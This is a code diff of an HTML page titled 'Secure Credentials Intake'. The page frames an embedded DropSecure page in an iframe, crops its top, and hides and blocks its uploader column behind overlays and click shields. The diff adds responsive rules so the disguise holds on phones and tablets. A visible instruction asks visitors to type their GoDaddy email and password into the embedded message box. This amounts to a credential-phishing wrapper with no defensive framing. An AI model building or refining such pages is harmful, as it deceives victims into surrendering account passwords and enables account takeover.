@@ -6,9 +6,10 @@
 <title>Secure Credentials Intake</title>
 <style>
   :root{
-    --offset: 360px;   /* crop this much from the top */
-    --vh: 1100px;      /* visible height of the box */
-    --mask: 52%;       /* how much of the RIGHT side to hide */
+    /* Default = desktop/wide */
+    --offset: 360px;   /* crop from TOP */
+    --vh: 1100px;      /* visible height */
+    --mask: 52%;       /* hide RIGHT portion (uploader on wide screens) */
   }
 
   body{ margin:0; font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif; }
@@ -28,35 +29,48 @@
     color:#222;background:#fff;border-bottom:1px solid #eee;
   }
 
-  /* regular width iframe; we’ll mask the right side */
+  /* The embedded DropSecure page */
   .ds-frame{
     position:absolute;inset:0;border:0;width:100%;
-    height:calc(var(--vh) + var(--offset) + 800px);
-    transform:translateY(calc(var(--offset) * -1)); /* crop top */
+    height:calc(var(--vh) + var(--offset) + 900px);
+    transform:translateY(calc(var(--offset) * -1)); /* crop TOP */
   }
 
-  /* blocks clicks on the cropped top */
+  /* block clicks in the cropped top zone */
   .click-shield{
     position:absolute;left:0;top:0;right:0;height:var(--offset);
     pointer-events:auto;background:transparent;z-index:10;
   }
 
-  /* hides the RIGHT column (uploader) visually + blocks clicks */
+  /* hide RIGHT column on wide viewports */
   .overlay-right{
     position:absolute;top:var(--offset);right:0;bottom:0;width:var(--mask);
-    background:#fff;z-index:20;pointer-events:auto;
-    /* optional subtle divider: */
-    box-shadow: -1px 0 0 #eee;
+    background:#fff;z-index:20;pointer-events:auto;box-shadow:-1px 0 0 #eee;
   }
 
+  /* ===== responsive tuning ===== */
+
+  /* large tablets (uploader still to the right, but tighter layout) */
+  @media (max-width: 1024px){
+    :root{ --offset: 420px; --vh: 1200px; --mask: 58%; }
+  }
+
+  /* small tablets / big phones: uploader jumps ABOVE the form */
+  @media (max-width: 820px){
+    :root{ --offset: 680px; --vh: 1300px; --mask: 0%; }  /* no right mask; crop more TOP */
+    .overlay-right{ width:0; }
+  }
+
+  /* mobile portrait: header + uploader stack even taller */
   @media (max-width: 640px){
-    :root{ --offset: 420px; --vh: 1250px; --mask: 100%; } /* on narrow screens, hide all right side */
+    :root{ --offset: 760px; --vh: 1380px; --mask: 0%; }
+    .overlay-right{ width:0; }
   }
 </style>
 </head>
 <body>
 
-  <div class="build-check">WRAPPER ACTIVE — left column shown, right uploader hidden</div>
+  <div class="build-check">WRAPPER ACTIVE — responsive crop (top/right) enabled</div>
 
   <div class="viewport">
     <div class="note">Enter your GoDaddy Email (line 1) and Password (line 2) in the message box below.</div>
@@ -72,3 +86,4 @@
 
 </body>
 </html>
+
